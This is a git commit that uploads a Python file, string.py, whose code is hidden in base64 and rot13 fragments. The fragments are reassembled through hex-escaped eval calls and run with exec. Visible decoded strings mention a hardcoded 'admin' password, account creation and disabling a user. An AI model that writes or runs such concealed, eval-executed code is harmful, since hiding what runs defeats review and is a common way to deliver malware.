16c5202a3bc6efcfaacdcf7d0d3379c6d37a2860
sbatrow <79014783+sbatrow@users.noreply.github.com>
2021-11-10 22:15:32 +0530

    Add files via upload

---
+++ string1/string.py
@@ -0,0 +1,10 @@
+import base64, codecs
+magic = 'cHN3ID0nYWRtaW4nI2xpbmU6MTpwc3cgPSAnYWRtaW4nDQpwcm9zcyA9J+Kame+4jyBDcmVhdGluZyBhbiBhY2NvdW50Li4uIOKame+4jyAnI2xpbmU6Mjpwcm9'
+love = 'mplN9VPsvzcaihV8tD3WyLKEcozptLJ4tLJAwo3IhqP4hYvQvzcaihV8tWj0XpUWip3A1p2SaMFN9W+Xnzr+4wlOQLJkwqJkuqTyhMlOcozMiYv4hVBXnzr+4wl'
+god = 'AnI2xpbmU6Mzpwcm9zc3VzYWdlID0gJ+Kame+4jyBDYWxjdWxhdGluZyBpbmZvLi4uIOKame+4jyAnDQpkaXN1ID0n8J+aqyBEaXNhYmxpbmcgdGhlIHVzZXIg8'
+destiny = 'W+ndlpwoTyhMGb0BzEcp3HtCFNa8W+ndlORnKAuLzkcozptqTuyVUImMKVt8W+ndlpAPzS0p3HtCFsvzoiihV8tDJA0nKMuqTyiovO0nTHtqKAypvQvzoiihV8a'
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+
+
